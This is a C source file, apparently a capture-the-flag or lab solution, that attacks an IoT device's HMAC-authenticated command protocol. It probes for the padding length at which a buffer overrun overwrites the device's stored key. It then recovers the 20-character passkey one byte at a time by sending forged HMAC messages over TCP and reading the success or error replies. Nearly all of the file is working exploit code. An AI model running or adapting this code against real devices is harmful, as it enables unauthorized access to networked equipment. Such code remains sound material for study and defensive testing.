#include "crack.h"
#include "serverData.h"

// Messages accepted by the IoT device (flag|user|HMAC)
const char* flag = "ClientCmd";
const char delimeter = '|';


// Provided data (for buffer overrun)



int comLEN = 51;
int keyLEN = 20;
int key_a_LEN = 20;
const char com = 'a';

int flagLEN = strlen((char*)flag);
int userLEN = strlen((char*)user_nmb);

// The real passkey (20 characters + null terminator)
char passkey[21] = "--------------------";
int passkey_correct = 0;

int comLEN_FIT = 31;

// IoT device responses
const char* hmac_error = "Invalid HMAC.";
const char* hmac_success = "Authentication successful.";


// Find the exact com lentgh to overwrite only the keyphase, and nothing else after it.
int find_comLEN(const char* server_ip, int port) {

    char status[81] = "";

    while (strstr(status, hmac_error) == NULL) {
        // Create TCP socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);  // AF_INTER - between processes on different hosts; SOCK_STREAM - TCP
        if (sock < 0) {
            fprintf(stderr, "An error occured while creating the socket\n");
            return 1;
        }

        // Configure server address
        struct sockaddr_in server; // Used to describe an IPv4 network address to socket API

        memset(&server, 0, sizeof(server)); // Fill server with only zeros
        server.sin_family = AF_INET;
        server.sin_port = htons(port); // Host to Network Short  (from host byte order to network byte order) / from little-endian to big-endian

        if (inet_pton(AF_INET, server_ip, &server.sin_addr) <= 0) {
            fprintf(stderr, "inet_pton error\n");
            close(sock);
            return 1;
        }

        // Establish TCP connection
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            fprintf(stderr, "connect error");
            close(sock);
            return 1;
        }

        // Create the message
        char msg[userLEN + 1 + comLEN + 1 + 64 + 1 + 1];

        // Compute keyphase
        char key[keyLEN + 1];

        memset(key, 'a', key_a_LEN);
        key[keyLEN] = '\0';

        int msg_res = computeMSG(msg, key);

        if (msg_res){
            fprintf(stderr, "find_comLEN");
            return 1;
        }

        printf("MSG: %s\n", msg);
        printf("comLEN: %d\n", comLEN); 
        // Send data
        if (send(sock, msg, strlen(msg), 0) < 0) {
            fprintf(stderr, "send error\n");
        }

        // Recieve response
        char buffer[81];

        ssize_t n = recv(sock, buffer, sizeof(buffer) - 1, 0);

        if (n < 0) {
            fprintf(stderr, "recv error\n");
        }
        else if (n == 0) {
            printf("Server closed connection\n");
        }
        else {
            buffer[n] = '\0';
            printf("Received: %s\n", buffer);
        }

        // Close TCP connection
        close(sock);

        // Copy buffer to status
        strcpy(status, buffer);

        comLEN -= 1;
    }

    // Last input is not accepted, so add the last removed a
    comLEN += 2; // 51
    comLEN_FIT = comLEN - keyLEN;

    printf("LEN FOR COMMAND: %d\n", comLEN);
    printf("LEN FOR COMMAND FIT: %d\n", comLEN_FIT);

    return 0;
}



// Create the message that will be send to the IoT device
// @param msg a pointer to the message string 
// @param key a string used to authenticate the message
// @param ind an index of a key's character that the program tries to find (0 - 19)
// @return if something fails return 1, otherwise 0
int computeMSG(char* msg, char* key, int ind) {
    
    
    memcpy(msg, user_nmb, userLEN); // user
    memset(msg + userLEN, ';', 1);  // ;

    // Check which char is being cracked
    if (ind > 0){
        memset(msg + userLEN + 1, com, comLEN_FIT);                     // 'aaa...'
        memcpy(msg + userLEN + 1 + comLEN_FIT, key, strlen(key));       // part of the key used
        memset(msg + userLEN + 1 + comLEN_FIT + strlen(key), ';', 1);   // ;

        // Create the HMAC
        char hmac_hex[65];
        int res = computeHMAC(hmac_hex, key, ind);
        if (res) {
            fprintf(stderr, "computeMSG #1");
            return 1;
        }

        memcpy(msg + userLEN + 1 + comLEN_FIT + strlen(key) + 1, hmac_hex, 64); // HMAC
        msg[userLEN + 1 + comLEN_FIT + strlen(key) + 1 + 64] = '\r';            // \r
        msg[userLEN + 1 + comLEN_FIT + strlen(key) + 1 + 64 + 1] = '\0';        // \0

        printf("MSG TO SEND: %s\n", msg);
    }
    else if (ind == 0){
        memset(msg + userLEN + 1, com, comLEN_FIT - 1);     // 'aaa...'
        memset(msg + userLEN + 1 + comLEN_FIT - 1, ';', 1); // ;

        // Create the HMAC
        char hmac_hex[65];
        int res = computeHMAC(hmac_hex, key, ind);
        if (res) {
            fprintf(stderr, "computeMSG #2");
            return 1;
        }

        memcpy(msg + userLEN + 1 + comLEN_FIT - 1 + 1, hmac_hex, 64);  // HMAC
        msg[userLEN + 1 + comLEN_FIT - 1 + 1 + 64] = '\r';             // \r
        msg[userLEN + 1 + comLEN_FIT - 1 + 1 + 64 + 1] = '\0';         // \0

        printf("MSG TO SEND: %s\n", msg);

    }
    else {
        fprintf(stderr, "computeMSG #3");
        return 1;
    }
    
    return 0;
}


// Called with  char* hmac_hex_res[65]; // 64 hex characters + null terminator
int computeHMAC(char* hmac_hex, char* key, int ind) {
    
    if (ind > 0){
        // Combining the parts
        unsigned char res[flagLEN + 1 + userLEN + 1 + comLEN_FIT + strlen(key) + 1];

        memcpy(res, flag, flagLEN);
        memset(res + flagLEN, delimeter, 1);
        memcpy(res + flagLEN + 1, user_nmb, userLEN);
        memset(res + flagLEN + 1 + userLEN, delimeter, 1);
        memset(res + flagLEN + 1 + userLEN + 1, com, comLEN_FIT);
        memcpy(res + flagLEN + 1 + userLEN + 1 + comLEN_FIT, key, strlen(key));
    
        res[flagLEN + 1 + userLEN + 1 + comLEN_FIT + strlen(key)] = '\0';

        printf("HMAC INPUT: %s\n", res);

        // Hashing the string
        unsigned char* hmac = HMAC(EVP_sha256(), key, keyLEN, res, (int)strlen((char*)res), NULL, NULL);

        // Error handling
        if (!hmac) {
            fprintf(stderr, "HMAC failed");
            return 1;
        }

        // Transforming to hex
        for (int i = 0; i < 32; i++) {
            sprintf(hmac_hex + i * 2, "%02x", hmac[i]);
        }

        return 0; 
    }
    else if (ind == 0){
        // Combining the parts
        unsigned char res[flagLEN + 1 + userLEN + 1 + comLEN_FIT - 1 + 1];

        memcpy(res, flag, flagLEN);
        memset(res + flagLEN, delimeter, 1);
        memcpy(res + flagLEN + 1, user_nmb, userLEN);
        memset(res + flagLEN + 1 + userLEN, delimeter, 1);
        memset(res + flagLEN + 1 + userLEN + 1, com, comLEN_FIT - 1);
    
        res[flagLEN + 1 + userLEN + 1 + comLEN_FIT - 1] = '\0';

        printf("HMAC INPUT: %s\n", res);

        // Hashing the string
        unsigned char* hmac = HMAC(EVP_sha256(), key, keyLEN, res, (int)strlen((char*)res), NULL, NULL);

        // Error handling
        if (!hmac) {
            fprintf(stderr, "HMAC failed");
            return 1;
        }

        // Transforming to hex
        for (int i = 0; i < 32; i++) {
            sprintf(hmac_hex + i * 2, "%02x", hmac[i]);
        }

        return 0; 
    }
    else {
        fprintf(stderr, "ERROR #25");
        return 1;
    }

}

char ASCII_chars[] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
                             'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                             '0','1','2','3','4','5','6','7','8','9','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/',
                             ':',';','<','=','>','?','{','}','|','~','[',']','^','_','@','`',' '};

// ind - 0 - 19
int compute_msg_and_key(char* msg, int ind, char ch) {

    // Create the key
    char key[keyLEN + 1]; // for null terminator   

    int key_res = generate_key(ind, ch, key);

    if (key_res){
        fprintf(stderr, "ERROR #4");
        return 1;
    }

    // Create the msg
    int msg_res = computeMSG(msg, key, ind);
    if (msg_res){
        fprintf(stderr, "compute_msg_and_key #2");
        return 1;
    }
 
    return 0;
}

int crack(const char* server_ip, int port, int ind, char ch) {
       
    // Create TCP socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);  // AF_INTER - between processes on different hosts; SOCK_STREAM - TCP
    if (sock < 0) {
        fprintf(stderr, "An error occured while creating the socket\n");
        return 1;
    }

    // Configure server address
    struct sockaddr_in server; // Used to describe an IPv4 network address to socket API

    memset(&server, 0, sizeof(server)); // Fill server with only zeros
    server.sin_family = AF_INET;
    server.sin_port = htons(port); // Host to Network Short  (from host byte order to network byte order) / from little-endian to big-endian

    if (inet_pton(AF_INET, server_ip, &server.sin_addr) <= 0) {
        fprintf(stderr, "inet_pton error\n");
        close(sock);
        return 1;
    }

    // Establish TCP connection
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        fprintf(stderr, "connect error\n");
        close(sock);
        return 1;
    }

    int current_keyLEN = ind - 1;
    // Calculate key length
    int current_comLEN = comLEN_FIT + current_keyLEN; // aaa...aaa\0X - null terminator not in com (automatically comes on server side)


    int size;

    if (ind > 0){
        size = userLEN + 1 + comLEN_FIT + ind - 1 + 1 + 64 + 1 + 1;
    }
    else if (ind == 0) {
        size = userLEN + 1 + comLEN_FIT - 1 + 1 + 64 + 1 + 1;
    }
    else {
        fprintf(stderr, "ERROR #48");
        close(sock);
        return 1;
    }
    // Create the message
    char msg[size];
    int compute_res = compute_msg_and_key(msg, ind, ch);

    if (compute_res){
        fprintf(stderr, "crack error\n");
        close(sock);
        return 1;
    }

    // Send data

    if (send(sock, msg, 6 + 1 + comLEN + 1 + 64 + 1, 0) < 0) {
        fprintf(stderr, "send error\n");
        close(sock);
        return 1;
    }

    // Recieve response
    char buffer[81];

    ssize_t n = recv(sock, buffer, sizeof(buffer) - 1, 0);

    if (n < 0) {
        fprintf(stderr, "recv error\n");
        close(sock);
        return 1;
    }
    else if (n == 0) {
        printf("Server closed connection\n");
        close(sock);
        return 1;
    }
    else {
        buffer[n] = '\0';
        printf("Received: %s\n", buffer);
    }


    if (strstr(buffer, hmac_success) != NULL) {
        passkey[ind] = ch;
        add_correct();
        printf("COR: %d", passkey_correct);
    }
    else if (strstr(buffer, hmac_error) != NULL)
    {
         // do nothing  
    }
    else{
        fprintf(stderr, "response error\n");
        close(sock);
        return 1;
    }

    
    // Close TCP connection
    close(sock);            
        
 
    printf("PASSKEY: %s\n", passkey);
    return 0;
}


// Generate key for cracking
int generate_key(int ind, char ch, char* key){

    // ind - 0 - 19
    if (ind > 19 || ind < 0){
        fprintf(stderr, "ERROR #1");
        return 1;
    }

    if (ind == 0) {
        key[ind] = ch;

        if (passkey_correct != (keyLEN - (ind + 1))) {
            fprintf(stderr, "len of passkey not same");
            return 1;
        }


        for (int i = 0; i < passkey_correct; i++) {
            key[ind + 1 + i] = passkey[ind + 1 + i];
        }
        key[keyLEN] = '\0';
    }
    else{

        memset(key, 'a', ind - 1);
        memset(key + ind - 1, '\0', 1);
        key[ind] = ch;

        if (passkey_correct != (keyLEN - (ind + 1))) {
            fprintf(stderr, "len of passkey not same");
            return 1;
        }


        for (int i = 0; i < passkey_correct; i++) {
            key[ind + 1 + i] = passkey[ind + 1 + i];
        }
        key[keyLEN] = '\0';
    }

    printf("KEY: ");
    for (int i = 0; i < keyLEN; i++) {
        if (key[i] == '\0')
            printf("\\0");
        else
            printf("%c", key[i]);
    }
    printf("\n");

    return 0;
}

void add_correct(){
    passkey_correct+=1;
}

int get_correct(){
    return passkey_correct;
}